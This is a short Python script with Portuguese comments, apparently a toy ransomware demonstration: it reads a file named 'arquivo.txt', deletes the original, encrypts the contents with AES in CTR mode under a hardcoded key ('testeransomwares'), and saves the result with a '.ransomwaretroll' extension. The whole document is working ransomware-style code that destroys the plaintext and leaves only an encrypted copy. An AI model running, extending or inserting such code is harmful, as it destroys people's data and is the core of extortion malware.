import os
import pyaes

# abrir arquivo para encriptacao
file_name = 'arquivo.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# remover arquivo original
os.remove(file_name)

# definir a chave de encriptacao
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

# criptografar arquivo
crypto_data = aes.encrypt(file_data)

# salvar aquivo criptografado
new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()